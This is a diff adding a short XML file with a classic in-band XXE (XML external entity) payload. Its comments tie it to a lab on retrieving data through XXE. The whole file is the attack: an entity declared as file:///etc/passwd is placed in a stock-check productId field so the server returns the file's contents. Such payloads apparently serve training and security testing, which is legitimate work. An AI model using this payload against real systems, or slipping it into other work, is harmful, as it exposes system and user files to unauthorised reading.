@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- Classic XXE - Direct file read (In-Band) -->
+<!-- Use: When XML response is reflected back to user -->
+<!-- Target Lab: Exploiting XXE to retrieve data -->
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<stockCheck>
+  <productId>&xxe;</productId>
+  <storeId>1</storeId>
+</stockCheck>
